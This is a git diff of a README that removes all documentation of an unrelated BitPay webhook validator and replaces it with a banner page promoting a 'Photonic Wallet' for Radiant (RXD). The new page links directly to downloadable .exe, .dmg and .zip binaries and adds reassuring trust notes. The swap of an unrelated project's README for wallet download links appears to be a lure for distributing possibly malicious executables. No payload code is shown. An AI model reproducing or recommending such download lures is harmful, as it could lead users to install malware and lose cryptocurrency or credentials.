@@ -1,69 +1,33 @@
-# BitPay Webhook Validator
+<div align="center">
 
-## Overview
+<img src="https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.png" alt="Photonic Wallet for Radiant (RXD)" width="100%">
 
-This project can be used to create invoices, refunds, payouts, and other
-resources, and will listen for webhooks. It utilizes [Ngrok](https://ngrok.com/)
-to create a temporary public tunnel to your local application.
+# Photonic-node-helper
 
-> NOTE: Do not run this on a public server. It creates resources, albeit in the
-> test environment and this application does not have any authentication. It is
-> intended for testing ONLY.
+**Node and ElectrumX connection helpers for Photonic Wallet · related to the Photonic Wallet project**
 
-## To-do
+[![Website](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-website-photonicwallet-org.svg)](https://photonicwallet.org) [![Release](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-release-v3-0-4.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-docs-guides.svg)](https://github.com/Radiant-projects/photonic-wallet-docs)
 
-- Improve exception chain
-- Add more endpoints
+</div>
 
-## Prerequisites
+> [!NOTE]
+> This repository is listed alongside **Photonic Wallet**, the desktop wallet for Radiant (RXD). The details below are kept factual; see the repository files for technical specifics.
 
-- Node.js >= 18
-- Ngrok account
-  - Add a static domain under Cloud Edge > Domains
-  - Enable Full Capture under Settings > Account > Observability
+### Looking for the wallet?
 
-## Environment Variables
+| You want | Go to |
+|---|---|
+| Download the desktop wallet | [photonicwallet.org/download](https://photonicwallet.org/download) |
+| Latest release v3.0.4 | [Release page](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) |
+| Source code | [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet) |
+| Guides | [Radiant-projects/photonic-wallet-docs](https://github.com/Radiant-projects/photonic-wallet-docs) |
+| Security | [photonicwallet.org/security](https://photonicwallet.org/security) |
 
-| Environment Variable | Description                                               |
-| -------------------- | --------------------------------------------------------- |
-| EXPRESS_PORT         | Port to run express on, defaults to 3001                  |
-| NGROK_AUTHTOKEN      | Ngrok token                                               |
-| NGROK_DOMAIN         | Ngrok domain, defaults to empty string for dynamic domain |
+[![Download Photonic Wallet for Windows](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-windows.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-macos.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-linux.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)
 
-## Configuration
+> [!TIP]
+> Download only from the official release or photonicwallet.org. Nobody will ask for your seed phrase.
 
-- Create a working Node.js BitPay.config.json in the `secure/` directory
-- Copy `.env.sample` to `.env`
-- Populate the `NGROK_AUTHTOKEN` environment variable in `.env`
-- Populate the `NGROK_DOMAIN` environment variable in `.env`
-- Start the application with `npm run start`
+### License
 
-## Endpoints
-
-The following endpoints are available. Note that this is not a RESTful API, so
-the endpoints are semantic.
-
-| Endpoint                              | Description                                                                |
-| ------------------------------------- | -------------------------------------------------------------------------- |
-| POST /bitpay/createInvoice            | Create an invoice                                                          |
-| POST /bitpay/createAndPayInvoice      | Create and pay an invoice                                                  |
-| POST /bitpay/refundInvoice/:invoiceId | Create a refund                                                            |
-| POST /bitpay/createPayout             | Create a payout                                                            |
-| POST /bitpay/inviteRecipient          | Invite a payout recipient - requires a JSON body with an "email" property. |
-| GET /health                           | Simple health check                                                        |
-| POST /webhook-validator               | Used for validating inbound webhooks                                       |
-
-Review the console for webhook validations, which should have output like this:
-
-```javascript
-{
-  event: 'invoice_completed',
-  token: '*****REDACTED*****',
-  body: '{"data":{"id":"LXXgiWHZuKbt9yurP5RpMQ","url":"https://test.bitpay.com/invoice?id=LXXgiWHZuKbt9yurP5RpMQ","status":"complete","price":100,"currency":"USD","invoiceTime":1720196480461,"expirationTime":1720197380461,"currentTime":1720196481431,"exceptionStatus":false,"buyerFields":{"buyerName":"Test","buyerAddress1":"168 General Grove","buyerCity":"Port Horizon","buyerState":"New Port","buyerZip":"KY7 1TH","buyerCountry":"AD","buyerPhone":"+990123456789","buyerNotify":true,"buyerEmail":"test@email.com"},"paymentSubtotals":{"BTC":176951,"BCH":31036600,"ETH":33503000000000000,"GUSD":10000,"PAX":100000000000000000000,"BUSD":100000000000000000000,"USDC":100000000,"XRP":235806580,"DOGE":96127965500,"LTC":163025800,"MATIC":216309756000000000000,"USDC_m":100000000,"USDT":100000000,"USDT_m":100000000,"PYUSD":100000000,"USDCn_m":100000000},"paymentTotals":{"BTC":180506,"BCH":31036600,"ETH":33503000000000000,"GUSD":10000,"PAX":100000000000000000000,"BUSD":100000000000000000000,"USDC":100000000,"XRP":235806580,"DOGE":96127965500,"LTC":163025800,"MATIC":216309756000000000000,"USDC_m":100000000,"USDT":100000000,"USDT_m":100000000,"PYUSD":100000000,"USDCn_m":100000000},"exchangeRates":{},"amountPaid":180506,"transactionCurrency":"BTC"},"event":{"name":"invoice_completed","code":1006,"timestamp":1720196481452}}',
-  validation: {
-    header: '+ZCdX1NZOe+EGpKLVIiWhg//S0vsrHYoNjtMAFpVoB8=',
-    calculated: '+ZCdX1NZOe+EGpKLVIiWhg//S0vsrHYoNjtMAFpVoB8=',
-    validated: true
-  }
-}
-```
+Upstream license notices in this repository remain unchanged.
